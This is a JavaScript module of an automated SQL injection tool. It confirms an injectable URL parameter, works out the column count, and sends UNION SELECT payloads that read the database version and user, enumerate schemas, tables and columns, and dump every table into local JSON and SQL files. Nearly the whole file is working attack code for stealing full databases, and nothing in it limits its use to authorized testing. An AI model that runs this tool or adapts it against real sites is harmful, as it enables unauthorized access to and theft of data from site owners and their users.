import fs from 'fs';
import { axiosInstance } from './http-client.js';
import {
  DETECTION_PAYLOADS,
  COLUMN_PAYLOADS,
  DATA_EXTRACTION_PAYLOADS
} from './config.js';
import { urlStore } from './url-store.js';
import { delay } from './utils.js';

export async function testSQLInjection(url) {
  const result = {
    vulnerable: false,
    columns: [],
    tables: new Set(),
    databases: new Set(),
    tableData: new Map(), // Stores extracted data from tables
    databaseInfo: {
      version: null,
      user: null,
      currentDb: null
    },
    successfulPayloads: []
  };

  const isVulnerable = await testBasicVulnerability(url);
  if (!isVulnerable) {
    return result;
  }

  result.vulnerable = true;
  console.log('[+] Basic vulnerability confirmed, starting comprehensive scan...');

  const columnCount = await findColumnCount(url);
  if (columnCount > 0) {
    console.log(`[+] Found ${columnCount} columns`);

    await extractSystemInfo(url, columnCount, result);
    await extractDatabaseSchemas(url, columnCount, result);

    for (const dbName of result.databases) {
      await extractDatabaseStructure(url, columnCount, dbName, result);
    }

    await dumpAllTables(url, columnCount, result); // Alterado para dumpar todas as tabelas
  }

  saveResultsToJSON(result);
  saveResultsToSQL(result);

  return result;
}

async function testBasicVulnerability(url) {
  for (const payload of DETECTION_PAYLOADS) {
    try {
      const testUrl = new URL(url);
      for (const [param] of testUrl.searchParams) {
        testUrl.searchParams.set(param, payload);
        const response = await axiosInstance.get(testUrl.toString());
        const responseText = response.data.toLowerCase();

        if (
          responseText.includes('sql') ||
          responseText.includes('error') ||
          responseText.includes('syntax')
        ) {
          console.log(`[!] SQL injection detected with payload: ${payload}`);
          return true;
        }
      }
    } catch (error) {
      if (!error.response) continue;
    }
  }
  return false;
}

async function findColumnCount(url) {
  for (let i = 0; i < COLUMN_PAYLOADS.length; i++) {
    try {
      const testUrl = new URL(url);
      for (const [param] of testUrl.searchParams) {
        testUrl.searchParams.set(param, COLUMN_PAYLOADS[i]);
        const response = await axiosInstance.get(testUrl.toString());

        if (!response.data.toLowerCase().includes('error')) {
          return i + 1;
        }
      }
    } catch (error) {
      continue;
    }
  }
  return 0;
}

async function extractSystemInfo(url, columnCount, result) {
  console.log('[*] Extracting system information...');

  const systemInfoPayloads = [
    `' UNION SELECT @@version,${Array(columnCount - 1).fill('NULL').join(',')}--`,
    `' UNION SELECT user(),${Array(columnCount - 1).fill('NULL').join(',')}--`,
    `' UNION SELECT database(),${Array(columnCount - 1).fill('NULL').join(',')}--`
  ];

  for (const payload of systemInfoPayloads) {
    try {
      const testUrl = new URL(url);
      for (const [param] of testUrl.searchParams) {
        testUrl.searchParams.set(param, payload);
        const response = await axiosInstance.get(testUrl.toString());
        const responseText = response.data;

        if (payload.includes('@@version')) {
          result.databaseInfo.version = extractDataFromResponse(responseText);
        } else if (payload.includes('user()')) {
          result.databaseInfo.user = extractDataFromResponse(responseText);
        } else if (payload.includes('database()')) {
          result.databaseInfo.currentDb = extractDataFromResponse(responseText);
        }
      }
    } catch (error) {
      continue;
    }
  }
}

async function extractDatabaseSchemas(url, columnCount, result) {
  console.log('[*] Enumerating database schemas...');

  const payload = `' UNION SELECT CONCAT(schema_name,'::'),${Array(columnCount - 1).fill('NULL').join(',')} FROM information_schema.schemata--`;

  try {
    const testUrl = new URL(url);
    for (const [param] of testUrl.searchParams) {
      testUrl.searchParams.set(param, payload);
      const response = await axiosInstance.get(testUrl.toString());
      const responseText = response.data;

      const schemas = extractListFromResponse(responseText);
      schemas.forEach(schema => {
        if (!schema.includes('information_schema')) {
          result.databases.add(schema);
        }
      });
    }
  } catch (error) {
    console.error('[-] Error extracting database schemas:', error.message);
  }
}

async function extractDatabaseStructure(url, columnCount, dbName, result) {
  console.log(`[*] Extracting structure for database: ${dbName}`);

  const tablePayload = `' UNION SELECT CONCAT(table_name,'::'),${Array(columnCount - 1).fill('NULL').join(',')} FROM information_schema.tables WHERE table_schema='${dbName}'--`;

  try {
    const testUrl = new URL(url);
    for (const [param] of testUrl.searchParams) {
      testUrl.searchParams.set(param, tablePayload);
      const response = await axiosInstance.get(testUrl.toString());
      const tables = extractListFromResponse(response.data);

      for (const table of tables) {
        result.tables.add(table);

        const columnPayload = `' UNION SELECT CONCAT(column_name,'::'),${Array(columnCount - 1).fill('NULL').join(',')} FROM information_schema.columns WHERE table_schema='${dbName}' AND table_name='${table}'--`;

        testUrl.searchParams.set(param, columnPayload);
        const columnResponse = await axiosInstance.get(testUrl.toString());
        const columns = extractListFromResponse(columnResponse.data);

        result.columns.push(...columns);
      }
    }
  } catch (error) {
    console.error(`[-] Error extracting structure for ${dbName}:`, error.message);
  }
}

async function dumpAllTables(url, columnCount, result) {
  console.log('[*] Attempting to dump all tables...');

  for (const table of result.tables) {
    console.log(`[*] Attempting to dump table: ${table}`);

    const columns = result.columns; // Obter todas as colunas

    if (columns.length > 0) {
      const dumpPayload = `' UNION SELECT CONCAT_WS('::',${columns.join(',')}),${Array(columnCount - 1).fill('NULL').join(',')} FROM ${table}--`;

      try {
        const testUrl = new URL(url);
        for (const [param] of testUrl.searchParams) {
          testUrl.searchParams.set(param, dumpPayload);
          const response = await axiosInstance.get(testUrl.toString());
          const extractedData = extractListFromResponse(response.data);

          if (extractedData.length > 0) {
            result.tableData.set(table, extractedData);
          }
        }
      } catch (error) {
        console.error(`[-] Error dumping table ${table}:`, error.message);
      }
    }
  }
}

function saveResultsToJSON(result) {
  const outputFile = 'sql_injection_results.json';
  const serializedResult = {
    ...result,
    tables: Array.from(result.tables),
    databases: Array.from(result.databases),
    tableData: Object.fromEntries(result.tableData)
  };

  fs.writeFileSync(outputFile, JSON.stringify(serializedResult, null, 2));
  console.log(`[+] Results saved to ${outputFile}`);
}

function saveResultsToSQL(result) {
  const outputFile = 'sql_dump.sql';
  const sqlDump = [];
  // Create SQL dump for each table
  for (const [tableName, rows] of result.tableData.entries()) {
    sqlDump.push(`-- Dumping data for table ${tableName}`);
    rows.forEach(row => {
      sqlDump.push(`INSERT INTO ${tableName} VALUES (${row.split('::').map(value => `'${value}'`).join(', ')});`);
    });
    sqlDump.push('\n');
  }

  // Write the dump to a file
  fs.writeFileSync(outputFile, sqlDump.join('\n'));
  console.log(`[+] SQL dump saved to ${outputFile}`);
}

function extractDataFromResponse(responseText) {
  const matches = responseText.match(/([a-zA-Z0-9_.-]+)::/);
  return matches ? matches[1] : null;
}

function extractListFromResponse(responseText) {
  const matches = responseText.match(/([a-zA-Z0-9_.-]+)::/g) || [];
  return matches.map(m => m.replace('::', ''));
}